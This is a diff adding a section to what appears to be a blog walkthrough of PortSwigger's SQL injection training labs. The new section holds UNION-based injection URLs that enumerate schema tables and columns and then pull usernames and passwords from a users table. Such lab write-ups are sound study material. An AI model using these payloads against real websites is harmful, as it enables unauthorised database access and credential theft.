@@ -66,12 +66,38 @@ After getting the number of arguments, now we need to check the types of argumen
 
 In step 3, we can use the [cheatsheet][ref_1] to use the query to obtain the version. Results are as image above.
 
+## Retrieving interesting stuff
+
+Now that we can identify the database, we can start to explore the tables available. Then enumerate the columns for us to form the payload (or the SQL query) to retrieve useful information. We will not work on the [third lab][ref_4].
+
+{% highlight ruby %}
+# Step 1 - 3 omitted, identify number of parameters, parameter types, and database type.
+# Step 4:  Using the database type, we can identify the schema tables. 
+https://0a7800e4038a767380d894e500860082.web-security-academy.net/filter?category=Accessories%27UNION+SELECT%20table_name,%20NULL%20FROM%20information_schema.tables--
+
+# Step 5: With the users, table, enumerate the columns available.
+https://0a7800e4038a767380d894e500860082.web-security-academy.net/filter?category=Accessories%27UNION+SELECT%20column_name,%20NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--
+
+# Step 6: Retrieve the username and password
+https://0a7800e4038a767380d894e500860082.web-security-academy.net/filter?category=Accessories%27UNION+SELECT%20username,%20password%20from%20users--
+
+# Extra: Concatenate the parameters
+https://0a7800e4038a767380d894e500860082.web-security-academy.net/filter?category=Accessories%27UNION+SELECT%20username%20||%20%27~%27%20||%20password,%20NULL%20from%20users--
+
+{% endhighlight %}
+![table_enumeration]({{ site.url }}/assets/images/database_scheme.png)
+*Tables enumeration*
+![column_enumeration]({{ site.url }}/assets/images/database_columns.png)
+*Column enumeration*
+![final_results]({{ site.url }}/assets/images/portswigget1_final.png)
+*Final Results from Lab 3*
 
 
 
 [ref_1]: https://portswigger.net/web-security/sql-injection/cheat-sheet
 [ref_2]: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
 [ref_3]: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+[ref_4]: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
 
 ## References
 [Portswigger - SQL Injection](https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli)
